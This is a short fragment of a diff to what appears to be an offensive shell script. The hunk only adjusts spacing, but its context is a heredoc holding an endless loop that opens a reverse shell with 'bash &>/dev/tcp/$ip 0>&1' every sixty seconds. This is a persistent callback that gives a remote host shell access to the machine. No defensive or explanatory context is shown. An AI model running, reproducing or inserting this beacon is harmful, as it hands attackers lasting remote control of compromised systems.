@@ -486,7 +486,7 @@ _bash=$(cat << EOF
 
 while true; do
 
-bash &>/dev/tcp/$ip  0>&1 & 
+bash &>/dev/tcp/$ip 0>&1 & 
 sleep 60
 
 done
